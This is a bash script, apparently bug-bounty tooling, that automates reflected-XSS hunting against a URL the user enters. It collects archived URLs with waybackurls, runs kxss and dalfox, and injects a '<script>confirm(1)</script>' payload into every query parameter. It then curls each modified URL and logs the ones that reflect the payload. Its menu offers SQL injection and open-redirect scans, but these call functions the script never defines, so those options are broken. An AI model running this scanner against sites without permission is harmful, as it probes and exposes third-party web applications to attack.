#!/bin/bash
#title:         JOD-XSS.sh
#description:   Automated and Modular Shell Script to Automate Security Vulnerability Scans
#author:        R12W4N, RUSHIJOD
#==============================================================================
RED=`tput setaf 1`
GREEN=`tput setaf 2`
RESET=`tput sgr0`
BLUE=`tput setaf 4`

function trap_ctrlc ()
{
    echo "Ctrl-C caught...performing clean up"

    echo "Doing cleanup"
    trap "kill 0" EXIT
    exit 2
}

trap "trap_ctrlc" 2 


####Add Functions Here
XSSURLSCAN(){
    #credit: hacktify
    read -p 'URL: ' URL
    read -p 'Add Custom Parameter like source= ' cparam
    #read -p 'BXSS Hunter URL; xss.ht' bxss
    
    waybackurls $URL > $project/$project-all-urls.log
    echo "${GREEN}Done with Waybackurls${RESET}"
    
    #need to change kxss location
    echo "${GREEN}[+]Waybackurl Output file > Running KXSS and piping it to Dalfox${RESET}"
    cat $project/$project-all-urls.log | /root/go/bin/kxss | sed 's/=.*/=/' | sed 's/URL: //' | sort -u | dalfox pipe --output $project/first.txt

    cat $project/$project-all-urls.log | grep "=" | egrep -iv ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt|js)" | qsreplace '"><script>confirm(1)</script>' | tee $project/$project-combinedfuzz.json && cat $project/$project-combinedfuzz.json 
    echo "${GREEN}[+]Waybackurl Output file > greping parameters with = > running with default payload...${RESET}"
    
    file="$project/$project-combinedfuzz.json"
    while IFS= read line
        do
            curl --silent --path-as-is --insecure "$line" | grep -qs "<script>confirm(1)" && echo ${RED}Vulnerable${RESET} $line\n && echo "$line\n" >> $project/second.txt
        done <"$file"

      
    echo "${GREEN}[+]Waybackurl Output file > greping parameters with = > Piping it to Dalfox...${RESET}"
    cat $project/$project-all-urls.log | grep "=" | egrep -iv ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt|js)" | sed 's/=.*/=/' | sort -u | dalfox pipe --output $project/third.txt 

    #read -p 'Add Custom Parameter like source= ' cparam
    echo "${GREEN}Checking on XSS with Dalfox on Custom Parameter given...${RESET}"
    cat $project/$project-all-urls.log | grep $cparam | sed 's/=.*/=/' | dalfox pipe --output $project/fourth.txt

    echo "${RED}>>>>JOOOOOOOODDDDDDDDDDD!!!!!<<<< ${RESET}"
           
}

#Menu options
options[0]="Run XSS Scan on Single URL"
options[1]="Run XSS Scan on Given File"
options[2]="Run SQL Injection Scan"
options[3]="Check for Open Redirect"
options[4]="Advance Vulnerability Scan"

#Variables
ERROR=" "

#Clear screen for menu
clear

#Menu function
function MENU {
    echo "Menu Options"
    for NUM in ${!options[@]}; do
        echo "[""${choices[NUM]:- }""]" $(( NUM+1 ))") ${options[NUM]}"
    done
    echo "$ERROR"
}

#Menu loop
while MENU && read -e -p "Select the desired options using their number (again to uncheck, ENTER when done): " -n1 SELECTION && [[ -n "$SELECTION" ]]; do
    clear
    if [[ "$SELECTION" == *[[:digit:]]* && $SELECTION -ge 1 && $SELECTION -le ${#options[@]} ]]; then
        (( SELECTION-- ))
        if [[ "${choices[SELECTION]}" == "+" ]]; then
            choices[SELECTION]=""
        else
            choices[SELECTION]="+"
        fi
            ERROR=" "
    else
        ERROR="Invalid option: $SELECTION"
    fi
done

#Actions to take based on selection
function ACTIONS {
    if [[ ${choices[0]} ]]; then
        #Option 1 selected
        echo "Option 1 selected; Running XSS Scan on Single URL"
	    XSSURLSCAN
    fi
    if [[ ${choices[1]} ]]; then
        #Option 2 selected
        echo "Option 2 selected; Running XSS Scan on Given File"
	nmap2
    fi
    if [[ ${choices[2]} ]]; then
        #Option 2 selected
        echo "Option 3 selected"
        nmap4
    fi
    if [[ ${choices[3]} ]]; then
        #Option 2 selected
        echo "Option 4 selected"
        rustscan1
    fi
}

read -p 'Project Name: ' project
echo $project
#banner
if [ -d $project ]
    then
        echo -e "${BLUE}[-] $project Directory already exists...${RESET}"
    else
        echo -e "${BLUE}[+] Creating $project directory.${RESET}"
        mkdir -p $project
fi

ACTIONS


